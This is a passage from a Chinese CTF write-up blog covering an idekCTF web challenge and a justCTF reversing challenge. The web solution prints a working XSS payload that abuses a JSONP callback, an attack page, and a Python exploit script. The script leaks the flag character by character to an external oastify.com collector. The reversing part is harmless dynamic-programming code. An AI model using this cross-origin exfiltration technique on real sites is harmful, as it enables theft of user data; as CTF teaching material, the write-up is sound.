punctuation">&lt;</span>iframe</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>&lt;script src="/api/view/anything?callback=alert">&lt;/script><span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
</code></pre></div><p class="x-p">然后正常访问这个笔记（<code class="x-inline-highlight">/note/...</code>）就会触发<code class="x-inline-highlight">alert</code>；因此后面我想通过<code class="x-inline-highlight">a</code>标签的<code class="x-inline-highlight">href</code>带外，因为通过JSONP可以触发点击事件，但是在<code class="x-inline-highlight">iframe</code>中的<code class="x-inline-highlight">a</code>标签点击时会被CSP限制：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Plain Text</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>Refused to frame '...' because it violates the following Content Security Policy directive: "default-src 'none'". Note that 'frame-src' was not explicitly set, so 'default-src' is used as a fallback.
</code></pre></div><p class="x-p">我一直以为这个是无法绕过的，但其实只需要给<code class="x-inline-highlight">a</code>标签添加<code class="x-inline-highlight">target="_blank"</code>或<code class="x-inline-highlight">target="_top"</code>属性就可以了。顺着这个思路，看到一个有意思的民间解法，同样是构造一个攻击页面：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">HTML</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
    window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"{{target}}/note/{{note_id}}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">"{{target}}/api/flag"</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
</code></pre></div><p class="x-p">在访问这个页面时，会打开一个新窗口加载笔记，然后当前窗口跳转到<code class="x-inline-highlight">/api/flag</code>；</p><p class="x-p">在笔记页面，创建多个<code class="x-inline-highlight">a</code>标签：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>i <span class="token operator">=</span> <span class="token number">9</span>
<span class="token comment"># {"flag":"idek{...}"}</span>
<span class="token comment">#          ^</span>
<span class="token comment">#         i=9</span>

anchors <span class="token operator">=</span> <span class="token string">"\n"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>
    <span class="token string-interpolation"><span class="token string">f'&lt;a id="</span><span class="token interpolation"><span class="token punctuation">{</span>ch<span class="token punctuation">}</span></span><span class="token string">" href="//caqwk7ios7d1jrukkpeytl9hb8hz5sth.oastify.com/?flag_</span><span class="token interpolation"><span class="token punctuation">{</span>i <span class="token operator">-</span> <span class="token number">9</span><span class="token punctuation">}</span></span><span class="token string">=</span><span class="token interpolation"><span class="token punctuation">{</span>ch<span class="token punctuation">}</span></span><span class="token string">" target="_blank"></span><span class="token interpolation"><span class="token punctuation">{</span>ch<span class="token punctuation">}</span></span><span class="token string">&lt;/a>'</span></span>
    <span class="token keyword">for</span> ch <span class="token keyword">in</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_{}"</span>
<span class="token punctuation">]</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"""
    &lt;iframe srcdoc='
        </span><span class="token interpolation"><span class="token punctuation">{</span>anchors<span class="token punctuation">}</span></span><span class="token string">
        &lt;script src="/api/view/anything?callback=window[top.opener.document.body.innerText[</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">]].click">&lt;/script>
    '>&lt;/iframe>
"""</span></span>
</code></pre></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p>为<code class="x-inline-highlight">a</code>标签设置了<code class="x-inline-highlight">id=xxx</code>后，可以通过window.xxx访问到这个元素；（对任意标签都适用）</p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p class="x-p">注意这些<code class="x-inline-highlight">a</code>标签是在<code class="x-inline-highlight">iframe</code>中定义并被点击的，而这里的<code class="x-inline-highlight">iframe</code>作为笔记内容被加载；此时JSONP回调中：</p><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">top</code>取得的是笔记页面的<code class="x-inline-highlight">window</code>对象；</p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">top.opener</code>取得的是攻击页面的<code class="x-inline-highlight">window</code>对象；（因为是通过攻击页面<code class="x-inline-highlight">window.open</code>打开的笔记页面）</p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p>攻击页面在打开笔记页面后，立刻跳转到了<code class="x-inline-highlight">/api/flag</code>，此时<code class="x-inline-highlight">top.opener.document.body.innerText</code>就是flag的内容了！因此这里<code class="x-inline-highlight">top.opener.document.body.innerText[...]</code>刚好取到了<code class="x-inline-highlight">/api/flag</code>的响应的第<code class="x-inline-highlight">i</code>个字符；</p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">window[...]</code>又拿到了对应的<code class="x-inline-highlight">a</code>标签，最后通过<code class="x-inline-highlight">click</code>带外。</p></div></div></div></div><h4 class="x-h3">完整代码</h4><p class="x-p">最终的攻击页面代码如下：</p><p class="x-p"><code class="x-inline-highlight">index.html</code>：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">HTML</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Exploit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
    window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"{{target}}/note/{{note_id}}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">"{{target}}/api/flag"</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
</code></pre></div><p class="x-p"><code class="x-inline-highlight">exp.py</code>：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template
<span class="token keyword">import</span> requests

target <span class="token operator">=</span> <span class="token string">"https://jnotes-web.chal.idek.team"</span>

i <span class="token operator">=</span> <span class="token number">9</span>
<span class="token comment"># {"flag":"idek{...}"}</span>
<span class="token comment">#          ^</span>
<span class="token comment">#         i=9</span>

anchors <span class="token operator">=</span> "

    <span class="token string-interpolation"><span class="token string">f'&lt;a id="</span><span class="token interpolation"><span class="token punctuation">{</span>ch<span class="token punctuation">}</span></span><span class="token string">" href="//caqwk7ios7d1jrukkpeytl9hb8hz5sth.oastify.com/?flag_</span><span class="token interpolation"><span class="token punctuation">{</span>i <span class="token operator">-</span> <span class="token number">9</span><span class="token punctuation">}</span></span><span class="token string">=</span><span class="token interpolation"><span class="token punctuation">{</span>ch<span class="token punctuation">}</span></span><span class="token string">" target="_blank"></span><span class="token interpolation"><span class="token punctuation">{</span>ch<span class="token punctuation">}</span></span><span class="token string">&lt;/a>'</span></span>
    <span class="token keyword">for</span> ch <span class="token keyword">in</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_{}"</span>
<span class="token punctuation">]</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"""
    &lt;iframe srcdoc='
        </span><span class="token interpolation"><span class="token punctuation">{</span>anchors<span class="token punctuation">}</span></span><span class="token string">
        &lt;script src="/api/view/anything?callback=window[top.opener.document.body.innerText[</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">]].click">&lt;/script>
    '>&lt;/iframe>
"""</span></span>

resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target <span class="token operator">+</span> <span class="token string">"/api/post"</span><span class="token punctuation">,</span> json<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"noteContent"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span> <span class="token string">"noteTitle"</span><span class="token punctuation">:</span> <span class="token string">"anything"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
note_id <span class="token operator">=</span> resp<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>note_id<span class="token punctuation">)</span>

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">,</span> template_folder<span class="token operator">=</span><span class="token string">"."</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">,</span> target<span class="token operator">=</span>target<span class="token punctuation">,</span> note_id<span class="token operator">=</span>note_id<span class="token punctuation">)</span>


app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> <span class="token number">5003</span><span class="token punctuation">)</span>
</code></pre></div><img alt="img" loading="lazy" width="470" height="86" decoding="async" data-nimg="1" class="x-image x-image-invert" style="color:transparent;height:auto" src="/_next/static/media/3.d28a917b.jpg"/><img alt="img" loading="lazy" width="470" height="86" decoding="async" data-nimg="1" class="x-image x-image-invert" style="color:transparent;height:auto" src="/_next/static/media/4.048400fe.jpg"/><p class="x-p">这样就可以逐位带外flag了。（也可以考虑更自动化的实现）</p><h2 class="x-h1">justCTF/rev/slowrun</h2><p class="x-p">分析整个程序能看出这是一个大整数运算的实现，生成flag时有两个函数递归进行调用：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Plain Text</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>F(x): x - 4 + (73 * x**5) + (8 * x**3) + G(x-1), F(0) = 2, else F(x) = 1 for x &lt;= 1
G(x): F(x-1) + 3F(x-2) - 5F(x-3) + (3 * x**4), G(x) = 1 for x &lt;= 1
flag = F(13337) % A + B
</code></pre></div><p class="x-p">A和B是两个大整数常数，可以直接在程序中找到。<code class="x-inline-highlight">F</code>和<code class="x-inline-highlight">G</code>函数的递归调用会导致计算量非常大，直接运行会超时，用动态规划重写一下：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes

A <span class="token operator">=</span> <span class="token number">12871709638832864416674237492708808074465131233250468097567609804146306910998417223517320307084142930385333755674444057095681119233485961920941215894136808839080569675919567597231</span>
B <span class="token operator">=</span> <span class="token number">805129649450289111374098215345043938348341847793365469885914570440914675704049341968773123354333661444680237475120349087680072042981825910641377252873686258216120616639500404381</span>


<span class="token keyword">def</span> <span class="token function">F</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> x <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">2</span>
    <span class="token keyword">elif</span> x <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">1</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        result <span class="token operator">=</span> x <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">73</span> <span class="token operator">*</span> x <span class="token operator">**</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">*</span> x <span class="token operator">**</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> G<span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> result


<span class="token keyword">def</span> <span class="token function">G</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> x <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">1</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        result <span class="token operator">=</span> F<span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> F<span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">5</span> <span class="token operator">*</span> F<span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">3</span> <span class="token operator">*</span> x <span class="token operator">**</span> <span class="token number">4</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> result


fs <span class="token operator">=</span> <span class="token punctuation">[</span>F<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> F<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> F<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
gs <span class="token operator">=</span> <span class="token punctuation">[</span>G<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> G<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> G<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

<span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">13338</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    gs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>fs<span class="token punctuation">[</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> fs<span class="token punctuation">[</span>x <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">5</span> <span class="token operator">*</span> fs<span class="token punctuation">[</span>x <span class="token operator">-</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">3</span> <span class="token operator">*</span> x <span class="token operator">**</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    fs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">73</span> <span class="token operator">*</span> x <span class="token operator">**</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">*</span> x <span class="token operator">**</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> gs<span class="token punctuation">[</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>F<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">,</span> fs<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 6759072 6759072</span>

flag <span class="token operator">=</span> fs<span class="token punctuation">[</span><span class="token number">13337</span><span class="token punctuation">]</span> <span class="token operator">%</span> A <span class="token operator">+</span> B
<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># justCTF{1n_0rd3r_70_und3r574nd_r3cur510n_y0u_h4v3_t0_und3r574nd_r3cur510n}</span>
</code></pre></div><!--/$--><button class="like-button not-loaded"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 1024 896"><path d="M512 911l-62-56C230 655 85 524 85 363 85 231 189 128 320 128c74 0 145 35 192 89 47-55 118-89 192-89 131 0 235 103 235 235 0 161-145 293-365 492l-62 56z" fill="#FCFCFC"></path></svg></button></div><div id="sidebar"><div id="sidebar-width-wrapper"><div class="category-card sidebar-card show-list"><div class="category-card-header"><div class="category-name">安全学习<!-- --> (<!-- -->15<!-- -->)</div><button class="category-rightarrow"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 1024 1024"><path d="m761 532 2-3c9-18 6-40-10-55L400 140a48 48 0 0 0-66 70l317 299-316 305a48 48 0 0 0 67 69l350-338 1-2 2-1c3-3 4-7 6-10z" fill="#50505C"></path></svg></button></div><div class="category-card-ul-wrapper"><ul class="category-card-ul"><li><a class="link" href="/longtime/wp-portswigger/"><span>PortSwigger Writeup</span></a></li><li><a class="link" href="/24b/learn-cwes/"><span>Learn CWEs &amp; Real-word Examples</span></a></li><li><a class="link" href="/24d/wp-bluehens-2024/"><span>BlueHens CTF 2024 Writeup</span></a></li><li><a class="link" href="/24d/wp-1337uplive-2024/"><span>1337UP LIVE CTF 2024 Writeup</span></a></li><li><a class="link" href="/24d/wp-m0lecon-2025/"><span>m0leCon Beginner CTF 2025 Writeup</span></a></li><li><a class="link" href="/24d/wp-0xl4ugh-2024/"><span>0xl4ugh CTF 2024 Writeup</span></a></li><li><a class="link" href="/25a/wp-nullcon-hackim-2025/"><span>Nullcon HackIM CTF 2025 Writeup</span></a></li><li><a class="link" href="/25a/wp-picoctf-2025/"><span>picoCTF 2025 Writeup</span></a></li><li><a class="link" href="/25a/wp-cyber-apocalypse-ctf-2025/"><span>HTB Cyber Apocalypse CTF 2025 Writeup</span></a></li><li><a class="link" href="/25a/wp-swampctf-2025/"><span>SwampCTF 2025 Writeup</span></a></li><li><a class="link" href="/25b/wp-1753ctf-2025/"><span>1753CTF 2025 Writeup</span></a></li><li><a class="link" href="/25b/wp-nahamcon-ctf-2025/"><span>NahamCon CTF 2025 Writeup</span></a></li><li><a class="link" href="/25c/wp-downunder-ctf-2025/"><span>DownUnder CTF 2025 Writeup</span></a></li><li><a class="link" href="/25c/wp-shakti-ctf-2025/"><span>Shakti CTF 2025 Writeup</span></a></li><li><a class="link active" href="/25c/wp-idekctf-justctf-2025/"><span>idekCTF 2025 &amp; justCTF 2025 Writeup</span></a></li></ul></div></div><div class="category-card sidebar-card show-list"><div class="category-card-header"><div class="category-name">安全研究<!-- --> (<!-- -->8<!-- -->)</div><button class="category-rightarrow"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 1024 1024"><path d="m761 532 2-3c9-18 6-40-10-55L400 140a48 48 0 0 0-66 70l317 299-316 305a48 48 0 0 0 67 69l350-338 1-2 2-1c3-3 4-7 6-10z" fill="#50505C"></path></svg></button></div><div class="category-card-ul-wrapper"><ul class="category-card-ul"><li><a class="link" href="/24b/papers-sec-240514-taintmini/"><span>论文阅读：TAINTMINI: Detecting Flow of Sensitive Data in Mini-Programs with Static Taint Analysis (ICSE 2023)</span></a></li><li><a class="link" href="/24c/papers-sec-240728-2fa-consistency/"><span>论文阅读：A Systematic Study of the Consistency of Two-Factor Authentication User Journeys on Top-Ranked Websites (NDSS 2023)</span></a></li><li><a class="link" href="/24c/papers-sec-240810-conquer/"><span>论文阅读：Do Not Give A Dog Bread Every Time He Wags His Tail: Stealing Passwords through Content Queries (CONQUER) Attack (NDSS 2023)</span></a></li><li><a class="link" href="/24c/papers-sec-240817-2fa-failures/"><span>论文阅读：Security and Privacy Failures in Popular 2FA Apps (Security 2023)</span></a></li><li><a class="link" href="/24c/papers-sec-240824-zxcvbn/"><span>论文阅读：zxcvbn: Low-Budget Password Strength Estimation (Security 2016)</span></a></li><li><a class="link" href="/24c/papers-sec-240902-pafa-authentication/"><span>论文阅读：Maginot Line: Assessing a New Cross-app Threat to PII-as-Factor Authentication in Chinese Mobile Apps (NDSS 2024)</span></a></li><li><a class="link" href="/24c/papers-sec-240922-pre-hijacked-accounts/"><span>论文阅读：Pre-hijacked accounts: An Empirical Study of Security Failures in User Account Creation on the Web (Security 2022)</span></a></li><li><a class="link" href="/24d/papers-sec-241207-aimie/"><span>论文阅读：Understanding and Detecting Abused Image Hosting Modules as Malicious Services (CCS 2023)</span></a></li></ul></div></div><div class="category-card sidebar-card show-list"><div class="category-card-header"><div class="category-name">网络杂识<!-- --> (<!-- -->9<!-- -->)</div><button class="category-rightarrow"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 1024 1024"><path d="m761 532 2-3c9-18 6-40-10-55L400 140a48 48 0 0 0-66 70l317 299-316 305a48 48 0 0 0 67 69l350-338 1-2 2-1c3-3 4-7 6-10z" fill="#50505C"></path></svg></button></div><div class="category-card-ul-wrapper"><ul class="category-card-ul"><li><a class="link" href="/23d/database-3nf/"><span>数据库设计三大范式</span></a></li><li><a class="link" href="/23d/hust-cas-login/"><span>Python登录华科统一身份认证接口</span></a></li><li><a class="link" href="/23d/github-linguist-vendored/"><span>不统计Github仓库某个目录下的语言</span></a></li><li><a class="link" href="/24a/deepl-shortcut-setting/"><span>解决：DeepL该快捷键已被使用</span></a></li><li><a class="link" href="/24a/git-merge-allow-unrelated-histories/"><span>记录：使用--allow-unrelated-histories</span></a></li><li><a class="link" href="/24b/injective-surjective-bijective/"><span>单射、满射、双射</span></a></li><li><a class="link" href="/25a/tai-e-a2-additional-case/"><span>南京大学程序分析Lab2（常量传播）易错样例补充</span></a></li><li><a class="link" href="/25a/tai-e-a3-solution/"><span>南京大学程序分析Lab3（死代码消除）思路</span></a></li><li><a class="link" href="/25b/debug-x86_64-program-in-arm64-system/"><span>使用QEMU在ARM64系统上调试x86_64程序</span></a></li></ul></div></div><div class="category-card sidebar-card show-list"><div class="category-card-header"><div class="category-name">算法<!-- --> (<!-- -->26<!-- -->)</div><button class="category-rightarrow"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 1024 1024"><path d="m761 532 2-3c9-18 6-40-10-55L400 140a48 48 0 0 0-66 70l317 299-316 305a48 48 0 0 0 67 69l350-338 1-2 2-1c3-3 4-7 6-10z" fill="#50505C"></path></svg></button></div><div class="category-card-ul-wrapper"><ul class="category-card-ul"><li><a class="link" href="/24b/sorting-algorithm/"><span>排序算法总结与代码实现</span></a></li><li><a class="link" href="/24b/mst-and-sp/"><span>最小生成树与最短路算法</span></a></li><li><a class="link" href="/24a/csp-2016-04/"><span>CSP 201604 T1-T4题解</span></a></li><li><a class="link" href="/24a/csp-2018-03/"><span>CSP 201803 T1-T4题解</span></a></li><li><a class="link" href="/24a/csp-2020-06/"><span>CSP 202006 T1-T4题解</span></a></li><li><a class="link" href="/24a/csp-2020-09/"><span>CSP 202009 T1-T4题解</span></a></li><li><a class="link" href="/24a/csp-2020-12/"><span>CSP 202012 T1-T5题解</span></a></li><li><a class="link" href="/24a/csp-2022-06/"><span>CSP 202206 T1-T5题解</span></a></li><li><a class="link" 